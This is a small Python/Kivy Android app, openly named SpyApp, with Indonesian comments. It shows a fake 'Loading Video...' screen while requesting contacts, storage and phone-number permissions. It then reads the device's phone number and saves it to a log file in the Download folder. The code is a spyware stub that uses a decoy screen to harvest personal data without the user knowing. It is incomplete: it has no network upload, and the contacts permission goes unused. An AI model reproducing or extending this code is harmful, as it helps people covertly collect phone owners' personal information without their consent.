from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout

from android.permissions import request_permissions, Permission
from jnius import autoclass
import os

class MainLayout(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = 'vertical'
        self.add_widget(Label(text='Memuat Video...'))
        request_permissions([
            Permission.READ_CONTACTS,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.READ_PHONE_NUMBERS
        ])
        self.extract_data()

    def extract_data(self):
        # Contoh pengambilan nomor telepon (Android 10 ke bawah)
        TelephonyManager = autoclass('android.telephony.TelephonyManager')
        Context = autoclass('android.content.Context')
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        telephony_manager = activity.getSystemService(Context.TELEPHONY_SERVICE)
        phone_number = telephony_manager.getLine1Number()

        # Simpan hasil ke file di folder Download
        download_path = "/storage/emulated/0/Download/"
        with open(os.path.join(download_path, "info_log.txt"), "w") as f:
            f.write("Nomor HP: {}\n".format(phone_number))

class SpyApp(App):
    def build(self):
        return MainLayout()

if __name__ == '__main__':
    SpyApp().run()
